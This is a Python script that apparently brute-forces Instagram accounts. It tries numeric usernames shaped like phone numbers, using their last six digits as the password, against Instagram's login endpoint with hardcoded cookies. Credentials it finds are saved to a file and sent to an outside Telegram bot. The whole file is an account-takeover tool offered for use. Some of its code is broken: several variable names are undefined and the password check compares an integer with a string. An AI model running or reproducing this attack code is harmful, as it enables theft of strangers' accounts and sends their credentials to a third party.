import requests , random , time
from time import sleep

pa = (1212)
pasi = input("Enter Your Pass : ")
if pasi == pa:
    print("ok")
else:
    print("no")
    exit()    
mail = input("ENTER YOUR EMAIL : ")





E = "\033[1;92m"
H = "\033[1;93m"
R = "\033[31;1m"
C = "\033[1;97m"


mail = input("ENTER YOUR EMAIL : ")

id = input (F" {E}[{H}+{E}] {H}EnteR YouR iD : "+E)
token = input (F' {E}[{H}+{E}] {H}EnteR YouR ToKeN Bot : '+E)




b , f ,r =0,0,0
while True:
    time.sleep(0.5)
    N = '1234567890'
    S = ''.join(random.choice(N) for t in range (6))
    Username  = '98919' + S
    Password = S
    Url = f"https://www.instagram.com/api/v1/web/accounts/login/ajax/"
    Headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'ar,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
        'content-length': '489',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'datr=1KHWY_nWR0dVNZ4v18ms2uV4; mid=Y9ah1gALAAGUwKcQqcJm4l1QAnc5; ig_did=68EFE6FC-0B1F-40A6-AB71-AA60824A561E; ig_nrcb=1; shbid="13522\05436385130069\0541709654979:01f728dd918cca7a62b6f8a9802e618af317f7045d943375bad7e4a0c5b35ff690d2f76f"; shbts="1678118979\05436385130069\0541709654979:01f71d6faf1295fb2af55408acabe77bdb1e3f13d765725150254e195584401ae2cd346d"; csrftoken=NMm1t5Tqhq1AHB5DT5lBnFGHwFuEWMac',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'sec-ch-prefers-color-scheme': 'dark',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63',
        'x-asbd-id': '198387',
        'x-csrftoken': 'NMm1t5Tqhq1AHB5DT5lBnFGHwFuEWMac',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': '0',
        'x-instagram-ajax': '1007095850',
        'x-requested-with': 'XMLHttpRequest',
                }
    Data = {
        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:'+Password,
        'username': Username,
        'queryParams': '{}',
        'optIntoOneTap': False,
        'trustedDeviceRecords': '{}'
            }


    Req = requests.post(Url,headers=Headers,data=Data).text
    if "userId" in Req:
        f += 1
        print(f" {E}[+] HunT {Username} : {Password}")
        open("Good.txt","a").write(f"GmaiL : {Gmail}\n:PassworD : {Password}")
        requests.post(f'https://api.telegram.org/bot{token}/sendMassage?chat_id={iD}&text= Hello HunT New \n Username : {Username}\n Password : {Password}')
    elif "error_type" in Req:
       b += 1
       r += 1
    else:
          r += 1
          print(f"\r {E} [{H}+{E}] {H}TaKeN : {r} iP Block : {b} FounD : {f} User : {Username} Pass : {Password}",end="")
